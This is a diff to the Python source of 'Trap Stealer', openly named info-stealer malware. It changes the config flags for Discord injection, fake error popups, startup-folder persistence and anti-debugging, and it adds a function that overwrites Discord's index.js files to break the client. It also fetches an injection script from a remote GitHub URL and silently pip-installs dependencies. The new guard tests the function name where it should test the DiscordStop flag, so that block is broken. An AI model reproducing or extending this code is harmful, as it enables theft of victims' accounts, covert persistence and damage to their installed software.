@@ -32,13 +32,14 @@ import win32clipboard
 ### CONFIG ### 
 webhook = '' #Put ur webhook
 
-injection = True # If set to False it will not inject into discord
-fakeerror = True # If True it will make an fake error message at the end
-Startup = True # If True it will add the file into the startup folder
-shitty_message = True # If True it will print fake message, if you want to disable it replace with False
-antidebugging = True # If set to false it will dont check for VM or Debugger
-StartupMessage = 'An error occurred while trying to add Trap Stealer to the Startup folder.     Or maybe you just put Startup = False' # The Startup message is like that at the start and change if Startup is set to True
+injection = False # If set to False it will not inject into discord
+fakeerror = False # If True it will make an fake error message at the end
+Startup = False # If True it will add the file into the startup folder
+shitty_message = False # If True it will print fake message, if you want to disable it replace with False
+antidebugging = False # If set to false it will dont check for VM or Debugger
+DiscordStop = False # If set to True it will make discord cannot be launched again by just removing content from index.js #----- IT WILL DISABLE INJECTION -----#
 
+StartupMessage = 'An error occurred while trying to add Trap Stealer to the Startup folder.     Or maybe you just put Startup = False' # The Startup message is like that at the start and change if Startup is set to True
 # -----------------
 def antidebug():
     checks = [check_windows, check_ip, check_registry, check_dll]
@@ -184,6 +185,27 @@ for modl in requirements:
     except:
         subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
         time.sleep(3)
+
+
+def NoDiscord():
+    folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']
+    for folder_name in folder_list:
+        folder_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
+        if os.path.isdir(folder_path):
+            for root, dirs, files in os.walk(folder_path):
+                for file in files:
+                    if file == 'index.js' and 'discord_desktop_core-' in root:
+                        file_path = os.path.join(root, file)
+                        with open(file_path, "w+", encoding="utf-8") as f:
+                            f.write('ahah')
+try:
+    if NoDiscord == True:
+        NoDiscord()
+        injection = False
+    else:
+        pass
+except:
+    pass
 
 # DONT TOUCH
 inj_url = "https://raw.githubusercontent.com/TheCuteOwl/Trap-Stealer/main/index.js"
